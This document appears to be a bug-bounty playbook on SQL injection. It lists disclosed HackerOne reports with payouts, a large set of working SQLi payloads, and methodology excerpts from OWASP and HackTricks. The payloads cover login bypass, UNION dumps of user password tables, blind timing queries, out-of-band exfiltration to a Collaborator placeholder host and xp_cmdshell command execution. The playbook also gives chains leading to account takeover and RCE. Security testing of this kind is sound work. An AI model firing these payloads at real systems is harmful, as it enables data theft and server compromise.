# Real-World Playbook — SQL Injection

**Class:** `sqli` · **Coverage-matrix tier:** 1 · **Hunter2:** vuln_scanner.sh (nuclei/ghauri/sqlmap) · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed SQL Injection reports peak at **$25,000**. Rewarded across: Eternal, GitHub Security Lab, Grab, Internet Bug Bounty, Mail.ru, Razer, Uber, Valve.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **SQL Injection in report_xml.php through countryFilter[] parameter** — Valve, $25,000 · 407👍 · [383127](https://hackerone.com/reports/383127)
- **Time-Based SQL injection at city-mobil.ru** — Mail.ru, $15,000 · 631👍 · [868436](https://hackerone.com/reports/868436)
- **SQL injection at fleet.city-mobil.ru** — Mail.ru, $10,000 · 372👍 · [881901](https://hackerone.com/reports/881901)
- **SQL Injection [unauthenticated] with direct output at https://news.mail.ru/** — Mail.ru, $7,500 · 156👍 · [818972](https://hackerone.com/reports/818972)
- **[windows10.hi-tech.mail.ru]  Blind SQL Injection** — Mail.ru, $5,000 · 330👍 · [786044](https://hackerone.com/reports/786044)
- **turboslim.lady.mail.ru - Blind sql-injection.** — Mail.ru, $5,000 · 93👍 · [795291](https://hackerone.com/reports/795291)
- **SQL injection  delivery-club.ru (ClickHouse)** — Mail.ru, $5,000 · 76👍 · [1024773](https://hackerone.com/reports/1024773)
- **[www.zomato.com] SQLi - /php/██████████ - item_id** — Eternal, $4,500 · 326👍 · [403616](https://hackerone.com/reports/403616)
- **www.drivegrab.com SQL injection** — Grab, $4,500 · 203👍 · [273946](https://hackerone.com/reports/273946)
- **C++: Support Pqxx connector to search for sql injections to Postgres** — GitHub Security Lab, $4,500 · 15👍 · [1241583](https://hackerone.com/reports/1241583)
- **CVE-2024-42005: Potential SQL injection in QuerySet.values() and values_list()** — Internet Bug Bounty, $4,263 · 52👍 · [2646493](https://hackerone.com/reports/2646493)
- **Blind SQL injection on id.indrive.com** — inDrive, $4,134 · 199👍 · [2051931](https://hackerone.com/reports/2051931)
- **[api.easy2pay.co]  SQL Injection at fortumo via TransID parameter [Bypassing Signature Validation🔥]** — Razer, $4,000 · 232👍 · [894325](https://hackerone.com/reports/894325)
- **SQL Injection on sctrack.email.uber.com.cn** — Uber, $4,000 · 93👍 · [150156](https://hackerone.com/reports/150156)
- **Blind SQL injection on [city-mobil.ru/taxiserv/] in filter{"id_locality"}** — Mail.ru, $3,500 · 30👍 · [1133083](https://hackerone.com/reports/1133083)
- **Blind SQL Injection on news.mail.ru** — Mail.ru, $3,000 · 52👍 · [732430](https://hackerone.com/reports/732430)
- **SQL injection in Wordpress Plugin Huge IT Video Gallery at https://drive.uber.com/frmarketplace/** — Uber, $3,000 · 39👍 · [125932](https://hackerone.com/reports/125932)
- **SQL injection in 3rd party software Anomali** — Uber, $2,500 · 61👍 · [206872](https://hackerone.com/reports/206872)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
      `+HERP
      '||'DERP
      '+'herp
      ' 'DERP
      '%20'HERP
      '%2B'HERP
```
```
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
```
```
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```
```
' OR '1'='1'--
```
```
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```
```
' or 1=1 limit 1 --
```
```
sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```
```
sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b
'";
```
```
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```
```
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
```
```
1' UNION SELECT username, password FROM users --
```
```
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
```
```
LIMIT CAST((SELECT version()) as numeric) 
```
```
ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
```
```
http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
```
```
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
```
```
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
```
```
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```
```
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```
```
BENCHMARK(2000000,MD5(NOW()))
```
```
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```
```
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```
```
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```
```
1; EXEC xp_cmdshell('whoami') --
```
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
```
' union select 0x2720756e696f6e2073656c65637420312c3223#
```
```
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
```
   Username: attacker'--
   Email: attacker@example.com
```
```
   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
```
```
   query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
```
```
    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';

    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
    $stmt->execute([$_GET['name']]);
    // or
    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
    $stmt->execute(['name' => $_GET['name']]);
```
```
    # 1st Payload: ?#\0
    # 2nd Payload: anything
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### SQL Injection

|ID          |
|------------|
|WSTG-INJT-05|

#### Summary

SQL injection testing checks if it is possible to inject data into an application/site so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. Successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database, which if you didn't know already is quite bad.

An [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input to affect the execution of predefined SQL commands.

In general, the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:

`select title, text from news where id=$id`

In the example above the variable `$id` contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.

Because of the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user's choice. The example below illustrates the user-supplied data "10 or 1=1", changing the logic of the SQL statement, modifying the WHERE clause adding a condition "or 1=1".

`select title, text from news where id=10 or 1=1`

> **_NOTE:_**  Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.

SQL Injection attacks can be divided into the following three classes:

- Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward attack, in which the retrieved data is presented directly in the application web page.
- Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).
- Inferential or Blind: there is no actual transfer of data. Still, the tester can reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.

A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.

About the techniques to exploit SQL injection flaws, there are five common techniques. Also, those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):

- Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
- Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.
- Error-based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
- Out-of-band: the technique used to retrieve data using a different channel (e.g., make an HTTP connection to send the results to a web server).
- Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when the attacker doesn’t have some answer (result, output, or error) from the application.

#### Test Objectives

- Identify SQL injection points.
- Assess the severity of the injection and the level of access that can be achieved through it.

#### How to Test

##### Detection Techniques

The first step in this test is to understand when the application interacts with a DB Server to access some data. Typical examples of cases, when an application needs to talk to a DB, include:

- Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).
- Search engines: the string submitted by the user could be used in an SQL query that extracts all relevant records from a database.
- E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.

The tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests, and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.

The very first test usually consists of adding a single quote `'` or a semicolon `;` to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a Microsoft SQL Server, in this case):

```asp

*(truncated — open the source link for the full method)*

### From AllAboutBugBounty
### SQL injection

#### Introduction
It is an attack in which an attacker inserts untrusted data in the application that results in revealing sensitive information of the database. 

SQL Injection (SQLi) is a code injection attack where an attacker manipulates the data being sent to the server to execute malicious SQL statements to control a web application’s database server, thereby accessing, modifying and deleting unauthorized data. This attack is mainly used to take over database servers. 

- In-band SQLi (Classic SQLi) 
- Error-based SQLi
- Union-based SQLi 
- Inferential SQLi (Blind SQLi) 
- Boolean-based (content-based) Blind SQLi 
- Time-based Blind SQLi 
- Out-of-band SQLi 

#### Where to find
Everywhere

#### How to exploit
### SQLI tricks

#### GET

##### Error-Based

##### Simple test

`Adding a simpe quote '`

Example: `http://vulnerable-website.com/Less-1/?id=5'`

##### Fuzzing

Sorting columns to find maximum column

`http://vulnerable-website.com/Less-1/?id=-1 order by 1`

`http://vulnerable-website.com/Less-1/?id=-1 order by 2`

`http://vulnerable-website.com/Less-1/?id=-1 order by 3`

(until it stop returning errors)

---


##### Finding what column is injectable

**mysql**
`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, 3` (using the same amount of columns you got on the previous step)

**postgresql**
`http://vulnerable-website.com/Less-1/?id=-1 union select NULL, NULL, NULL` (using the same amount of columns you got on the previous step)

 one of the columns will be printed with the respective number

---


###### Finding version

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, version()` **mysql**
`http://vulnerable-website.com/Less-1/?id=-1 union select NULL, NULL, version()` **postgres**s


###### Finding database name

`http://vulnerable-website.com/Less-1/?id=-1 union select 1,2, database()` **mysql**

`http://vulnerable-website.com/Less-1/?id=-1 union select NULL,NULL, database()` **postgres**

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### SQL Injection


#### What is SQL injection?

An **SQL injection** is a security flaw that allows attackers to **interfere with an application's database queries**. This vulnerability can enable attackers to **view**, **modify**, or **delete** data they should not access, including other users' information or any data available to the application. Such actions may permanently alter the application's functionality or content, compromise the server, or cause a denial of service.

#### Entry point detection

When a site appears to be **vulnerable to SQL injection (SQLi)** due to unusual server responses to SQLi-related inputs, the **first step** is to understand how to **inject data into the query without disrupting it**. This requires identifying the method to **escape from the current context** effectively. These are some useful examples:

```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Auth-bypass SQLi at login → ATO/admin
- Union/error → dump users+hashes → crack → ATO
- Blind boolean/time → confirm via OOB; stacked → RCE where supported

## Hunter2 wiring
- **Run:** `vuln_scanner.sh (nuclei/ghauri/sqlmap)`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Error-based DB signature (SQL error string) with no confirmed data actually extracted from a real table
- nuclei `info` / version match with no PoC query run against the live DB
- Time-delay that could be network jitter — no controlled true/false boolean oracle proven
- WAF-filtered payload that only produced a cosmetic error, no rows returned
- sqlmap "possibly injectable" flag with nothing dumped to back it

**Conditionally valid (only WITH a chain):** confirmed extraction (union/error → dump users+hashes → crack → ATO), auth-bypass SQLi at login → admin, or blind boolean/time confirmed via OOB (stacked → RCE where supported).
